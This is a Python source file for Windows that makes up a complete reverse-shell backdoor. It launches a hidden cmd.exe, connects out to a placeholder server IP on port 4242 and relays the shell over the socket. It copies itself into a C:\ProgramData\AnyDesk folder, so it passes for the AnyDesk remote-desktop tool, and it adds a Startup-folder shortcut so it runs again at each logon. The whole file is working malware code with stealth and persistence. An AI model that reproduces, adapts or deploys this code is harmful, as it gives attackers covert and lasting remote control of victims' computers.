import socket
import subprocess
import threading
import os
import shutil
import pythoncom
from win32com.shell import shell, shellcon

def read_output(process, socket):
    # Continuously read the output from the command prompt process and send it through the socket
    while True:
        try:
            output = process.stdout.read(1024)
            if not output:
                break
            socket.sendall(output)
        except (socket.error, OSError):
            break

def recv_input(process, socket):
    # Continuously receive input from the socket and write it to the command prompt process
    while True:
        try:
            data = socket.recv(1024)
            if not data:
                break
            process.stdin.write(data)
            process.stdin.flush()
        except (socket.error, OSError):
            break

def create_hidden_startupinfo():
    # Create a hidden startup information object for the command prompt process
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    return startupinfo

def manage_connection(target_ip, target_port):
    # Create a command prompt process and establish a socket connection to the target IP address and port
    process = subprocess.Popen(
        ['cmd.exe'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        startupinfo=create_hidden_startupinfo()
    )

    try:
        socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_connection.connect((target_ip, target_port))

        # Start two threads to handle input/output between the process and the socket
        output_thread = threading.Thread(target=read_output, args=(process, socket_connection), daemon=True)
        output_thread.start()

        input_thread = threading.Thread(target=recv_input, args=(process, socket_connection))
        input_thread.start()

        input_thread.join()  # Wait for the input thread to finish

    except (socket.error, OSError):
        pass

    finally:
        socket_connection.close()

def create_shortcut(target, shortcut_path):
    # Create a shortcut (.lnk) for the target file at the specified shortcut path
    startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut = os.path.join(startup_folder, shortcut_path)

    # Delete the existing shortcut if it exists
    if os.path.exists(shortcut):
        os.unlink(shortcut)

    # Create a shell link object and set the target path and working directory for the shortcut
    shell_link = pythoncom.CoCreateInstance(
        shell.CLSID_ShellLink,
        None,
        pythoncom.CLSCTX_INPROC_SERVER,
        shell.IID_IShellLink
    )
    shell_link.SetPath(target)
    shell_link.SetWorkingDirectory(os.path.dirname(target))

    # Save the shortcut file
    persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
    persist_file.Save(shortcut, 0)

def main():
    # Source path of the file to be copied
    exe_path = os.path.join(os.getcwd(), "client.exe")

    # Destination path where the file will be copied
    anydesk_path = r"C:\ProgramData\AnyDesk"
    anydesk_client_path = os.path.join(anydesk_path, "client.exe")

    # Create the destination directory if it doesn't exist
    os.makedirs(anydesk_path, exist_ok=True)

    # Copy the file to the destination path
    shutil.copy2(exe_path, anydesk_client_path)

    # Create a shortcut for the copied file in the Startup folder
    shortcut_name = "client.lnk"
    create_shortcut(anydesk_client_path, shortcut_name)

    print(f"Shortcut for {anydesk_client_path} created in the Startup folder.")

    # Target IP and Port for the socket connection
    target_ip = 'SERVER_IP'  # Replace 'SERVER_IP' with the IP address of your server
    target_port = 4242

    manage_connection(target_ip, target_port)

if __name__ == '__main__':
    main()
